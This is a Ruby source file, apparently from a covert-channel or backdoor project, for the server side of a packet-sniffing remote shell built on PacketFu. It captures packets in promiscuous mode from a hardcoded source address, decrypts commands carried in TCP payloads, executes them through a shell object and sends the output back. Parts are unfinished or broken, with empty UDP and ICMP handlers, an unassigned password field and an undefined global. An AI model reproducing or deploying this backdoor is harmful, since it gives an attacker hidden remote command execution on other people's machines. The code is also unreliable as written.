require 'rubygems'
require 'packetfu'

require File.expand_path(File.join(File.dirname(__FILE__), 'shell.rb'))
require File.expand_path(File.join(File.dirname(__FILE__), 'cipher.rb'))

include PacketFu

class Server
  attr_accessor :iface, :tos, :port, :saddr, :pass, :shell
  def initialize(iface, tos, saddr, pass, timeout, port)
    @iface = iface
    @tos = tos
    @port = port
    @saddr = saddr
    @pass
    @shell = Shell.new(timeout)

    filter = "tcp and dst port " + @port.to_s + " and src 153.251.232.153"
    puts "waiting for message from client from src 153.251.232.153 and dest port:"
    puts @port.to_s

    cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
    cap.stream.each do |p|
      pkt = Packet.parse p
      a = pkt.ip_saddr.split(".")
      payload = pkt.payload
      dec = Encrypter.new(pass)
      @daddr = dec.decrypt(payload[0,16],payload[16..-1])
      return
    end
  end



  def start
  puts "starting server loop"
    while(true)
      case @tos
        when "icmp"
          icmp
        when "tcp"
          tcp
        when "udp"
          udp
      end
    end
  end

private

  def tcp
    puts "starting server reading"
    conn = Connector.new(@iface, @tos, @daddr, @pass, "server", @port)
    filter = "tcp and dst port " + @port.to_s + " and src " + $addrPass
    cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
    cap.stream.each do |p|
      pkt = Packet.parse p
      if pkt.is_tcp?
        puts pkt.tcp_dst
        puts pkt.ip_saddr
        puts pkt.ip_daddr

        puts "recieved client packet"
        str = conn.recv(pkt)
        puts str
        result = @shell.executeCmd(str)
        if result != nil
          conn.send(result)
        end
      end
    end
  end
  def udp
  end
  def icmp
    filter = "icmp and src 52.232.183.240"
  end
end
